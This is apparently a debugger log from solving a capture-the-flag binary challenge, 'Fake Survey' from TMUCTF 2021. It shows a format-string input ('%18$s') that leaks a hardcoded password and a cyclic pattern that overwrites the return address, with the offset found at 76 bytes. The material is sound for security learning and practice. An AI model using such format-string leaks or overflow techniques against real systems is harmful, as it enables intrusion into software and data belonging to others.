@@ -1,0 +1,162 @@
+gdb-peda$ vmmap
+Start      End        Perm	Name
+0x08048000 0x08049000 r--p	/home/mito/CTF/TMUCTF_2021/Pwn_Fake_Survey/fakesurvey
+0x08049000 0x0804a000 r-xp	/home/mito/CTF/TMUCTF_2021/Pwn_Fake_Survey/fakesurvey
+0x0804a000 0x0804b000 r--p	/home/mito/CTF/TMUCTF_2021/Pwn_Fake_Survey/fakesurvey
+0x0804b000 0x0804c000 r--p	/home/mito/CTF/TMUCTF_2021/Pwn_Fake_Survey/fakesurvey
+0x0804c000 0x0804d000 rw-p	/home/mito/CTF/TMUCTF_2021/Pwn_Fake_Survey/fakesurvey
+0x0804d000 0x0806f000 rw-p	[heap]
+0xf7dd3000 0xf7fa8000 r-xp	/lib/i386-linux-gnu/libc-2.27.so
+0xf7fa8000 0xf7fa9000 ---p	/lib/i386-linux-gnu/libc-2.27.so
+0xf7fa9000 0xf7fab000 r--p	/lib/i386-linux-gnu/libc-2.27.so
+0xf7fab000 0xf7fac000 rw-p	/lib/i386-linux-gnu/libc-2.27.so
+0xf7fac000 0xf7faf000 rw-p	mapped
+0xf7fcf000 0xf7fd1000 rw-p	mapped
+0xf7fd1000 0xf7fd4000 r--p	[vvar]
+0xf7fd4000 0xf7fd6000 r-xp	[vdso]
+0xf7fd6000 0xf7ffc000 r-xp	/lib/i386-linux-gnu/ld-2.27.so
+0xf7ffc000 0xf7ffd000 r--p	/lib/i386-linux-gnu/ld-2.27.so
+0xf7ffd000 0xf7ffe000 rw-p	/lib/i386-linux-gnu/ld-2.27.so
+0xfffdd000 0xffffe000 rw-p	[stack]
+
+gdb-peda$ x/80wx 0x0804c000
+0x804c000:	0x0804bf08	0xf7ffd940	0xf7feadd0	0xf7e41900
+0x804c010:	0x08049050	0x08049060	0x08049070	0x08049080
+0x804c020:	0xf7e39110	0xf7e3aca0	0x080490b0	0xf7debe30
+0x804c030:	0xf7e393d0	0x00000000	0x00000000	0x00000010
+0x804c040 <completed.7622>:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804c050:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804c060:	0x00000000	0x00000000	0x00000000	0x0000000
+
+[----------------------------------registers-----------------------------------]
+EAX: 0x12 
+EBX: 0x804c000 --> 0x804bf08 --> 0x1 
+ECX: 0x12 
+EDX: 0xf7fac890 --> 0x0 
+ESI: 0xffffcf50 --> 0xf7fab000 --> 0x1d7d8c 
+EDI: 0x0 
+EBP: 0xffffcf88 --> 0x0 
+ESP: 0xffffcf20 --> 0xffffcf30 --> 0xff000a61 
+EIP: 0x804966c (<main+589>:	call   0x8049110 <printf@plt>)
+EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8049663 <main+580>:	add    esp,0x10
+   0x8049666 <main+583>:	sub    esp,0xc
+   0x8049669 <main+586>:	push   DWORD PTR [ebp-0x2c]
+=> 0x804966c <main+589>:	call   0x8049110 <printf@plt>
+   0x8049671 <main+594>:	add    esp,0x10
+   0x8049674 <main+597>:	sub    esp,0x8
+   0x8049677 <main+600>:	push   DWORD PTR [ebp-0x2c]
+   0x804967a <main+603>:	push   DWORD PTR [ebp-0x20]
+Guessed arguments:
+arg[0]: 0xffffcf30 --> 0xff000a61 
+[------------------------------------stack-------------------------------------]
+0000| 0xffffcf20 --> 0xffffcf30 --> 0xff000a61 
+0004| 0xffffcf24 --> 0x10 
+0008| 0xffffcf28 --> 0xf7fab5c0 --> 0xfbad208b 
+0012| 0xffffcf2c --> 0x80495bf (<main+416>:	add    esp,0x10)
+0016| 0xffffcf30 --> 0xff000a61 
+0020| 0xffffcf34 --> 0x10 
+0024| 0xffffcf38 --> 0x804d160 --> 0xfbad2488 
+0028| 0xffffcf3c --> 0x80494f5 (<main+214>:	add    esp,0x10)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x0804966c in main ()
+gdb-peda$ find 1234567890
+Searching for '1234567890' in: None ranges
+Found 2 results, display max 2 items:
+ [heap] : 0x804d2c0 ("1234567890\n")
+[stack] : 0xffffcf40 ("1234567890\n")
+gdb-peda$ x/100wx 0xffffcf20
+0xffffcf20:	0xffffcf30	0x00000010	0xf7fab5c0	0x080495bf
+0xffffcf30:	0xff000a61	0x00000010	0x0804d160	0x080494f5
+0xffffcf40:	0x34333231	0x38373635	0x000a3039	0x0804948c
+0xffffcf50:	0xf7fab000	0xf7fab000	0x00000000	0xffffcf30
+0xffffcf60:	0x0000000f	0x0804d160	0xffffcf40	0x0000000f
+0xffffcf70:	0x00000001	0xffffd034	0xffffd03c	0xffffcfa0
+0xffffcf80:	0x00000000	0xf7fab000	0x00000000	0xf7debf21
+
+
+Enter password:
+%18$s
+
+Your password is CPRSyRMOFa3FVIF
+
+Enter password:
+CPRSyRMOFa3FVIF
+
+Your password is CPRSyRMOFa3FVIF
+===============================================================================
+
+You logged in successfully!
+Now tell us your opinions about the competition :)
+
+
+
+gdb-peda$ pattc 256
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G'
+gdb-peda$ run
+Starting program: /home/mito/CTF/TMUCTF_2021/Pwn_Fake_Survey/fakesurvey 
+===============================================================================
+=                *                          (                                 =
+=       *   )  (  `             (     *   ) )\ )      )    )     )    )       =
+=     ` )  /(  )\))(      (     )\  ` )  /((()/(   ( /( ( /(  ( /( ( /(       =
+=      ( )(_))((_)()\     )\  (((_)  ( )(_))/(_))  )(_)))\()) )(_)))\())      =
+=     (_(_()) (_()((_) _ ((_) )\___ (_(_())(_))_| ((_) ((_)\ ((_) ((_)\       =
+=     |_   _| |  \/  || | | |((/ __||_   _|| |_   |_  )/  (_)|_  ) / (_)      =
+=       | |   | |\/| || |_| | | (__   | |  | __|   / /| () |  / /  | |        =
+=       |_|   |_|  |_| \___/   \___|  |_|  |_|    /___|\__/  /___| |_|        =
+=                                                                             =
+===============================================================================
+=                                                                             =
+=                            Competition Survey                               =
+=                                                                             =
+===============================================================================
+
+Thank you for your participation. Your feedback on the competition is valuable
+to us. You must find the password to post your opinions.
+
+Enter password:
+CPRSyRMOFa3FVIF
+
+Your password is CPRSyRMOFa3FVIF
+===============================================================================
+
+You logged in successfully!
+Now tell us your opinions about the competition :)
+AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G
+
+*** Thanks for sharing your opinions with us ***
+
+Program received signal SIGSEGV, Segmentation fault.
+
+[----------------------------------registers-----------------------------------]
+EAX: 0x32 ('2')
+EBX: 0x41413341 ('A3AA')
+ECX: 0xf7fabdc7 --> 0xfac8900a 
+EDX: 0xf7fac890 --> 0x0 
+ESI: 0xffffcf50 ("AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA<\320\377\377\304\317\377\377\001")
+EDI: 0x0 
+EBP: 0x65414149 ('IAAe')
+ESP: 0xffffcf30 ("AJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA<\320\377\377\304\317\377\377\001")
+EIP: 0x41344141 ('AA4A')
+EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x41344141
+[------------------------------------stack-------------------------------------]
+0000| 0xffffcf30 ("AJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA<\320\377\377\304\317\377\377\001")
+0004| 0xffffcf34 ("fAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA<\320\377\377\304\317\377\377\001")
+0008| 0xffffcf38 ("AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA<\320\377\377\304\317\377\377\001")
+0012| 0xffffcf3c ("AgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA<\320\377\377\304\317\377\377\001")
+0016| 0xffffcf40 ("6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA<\320\377\377\304\317\377\377\001")
+0020| 0xffffcf44 ("AAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA<\320\377\377\304\317\377\377\001")
+0024| 0xffffcf48 ("A7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA<\320\377\377\304\317\377\377\001")
+0028| 0xffffcf4c ("MAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA<\320\377\377\304\317\377\377\001")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x41344141 in ?? ()
+gdb-peda$ AzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G
+Undefined command: "AzA".  Try "help".
+gdb-peda$ patto AA4A
+AA4A found at offset: 76
